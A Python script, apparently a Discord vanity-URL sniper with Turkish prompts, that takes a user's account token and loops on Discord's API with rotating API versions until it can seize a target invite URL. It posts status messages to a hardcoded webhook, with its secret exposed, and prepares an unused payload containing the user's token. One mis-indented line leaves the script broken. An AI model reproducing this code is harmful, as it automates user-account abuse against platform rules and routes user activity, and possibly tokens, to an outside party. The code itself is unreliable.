from datetime import datetime
import random
import requests
import time
from colorama import Fore
from pymongo import MongoClient

webhook = "https://discord.com/api/webhooks/1092876140953227366/UleqY3kZOuYNPylfm4FoS3Yg0gF8AgMZfr_QS-zOXZ8tVHZ7RVwcrpnDOieG1WYcUwtA"


api_list = ["v6", "v7", "v8", "v9", "v10"] 

def start():

    print(f"""{Fore.LIGHTBLUE_EX}

                
██╗░░░░░░█████╗░███╗░░██╗██████╗░██████╗░░█████╗░
██║░░░░░██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔══██╗
██║░░░░░██║░░██║██╔██╗██║██║░░██║██████╔╝███████║
██║░░░░░██║░░██║██║╚████║██║░░██║██╔══██╗██╔══██║
███████╗╚█████╔╝██║░╚███║██████╔╝██║░░██║██║░░██║
╚══════╝░╚════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝
                                                            
                                 Xd .gg/londra

    """)

time.sleep(1)

dt = datetime.now().strftime('[%H:%M:%S]')
print(f'{Fore.LIGHTCYAN_EX}{dt} {Fore.LIGHTGREEN_EX}')

def change_vanity():
   payload = {"code": vanity_url}
   apiid = random.choice(api_list) 
   response = requests.patch(f"https://discord.com/api/{apiid}/guilds/{guild_id}/vanity-url", headers=headers, json=payload)
   if response.status_code == 200:
      print(f"{Fore.LIGHTGREEN_EX}URL Başarıyla Alındı discord.gg/{vanity_url}")
      data = {"content" : f"discord.gg/{vanity_url} alındı @everyone! ", "username" : "NightShade"}
      requests.post(webhook, json=data)
   else:
      print(f"{Fore.LIGHTRED_EX}Hata Kodu : {response.status_code}")
      data = {"content" : f"discord.gg/{vanity_url} alınamadı hata kodu ", "username" : "NightShade"}
      requests.post(webhook, json=data)

def check_vanity():
   response = requests.get(f"https://discord.com/api/v9/invites/{vanity_url}?with_counts=true&with_expiration=true", headers=headers)
   if response.status_code == 404:
      change_vanity()
      exit()
   else:
      print(f'{Fore.LIGHTRED_EX}[vanity] Deniyorum...{Fore.RESET}')

start()

token = input(f'{Fore.LIGHTCYAN_EX}Token: {Fore.RESET}> ')
vanity_url = input(f'{Fore.LIGHTCYAN_EX}Alınacak url: {Fore.RESET}> ')
data = {"content" : f"{vanity_url} snip aktif@everyone! ", "username" : "NightShade"}
      requests.post(webhook, json=data)
guild_id = input(f'{Fore.LIGHTCYAN_EX} Server id {Fore.RESET}> ')
headers = {"authorization": token,
               "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"}

data = {
    "content": token
}
 
while True:
   check_vanity()
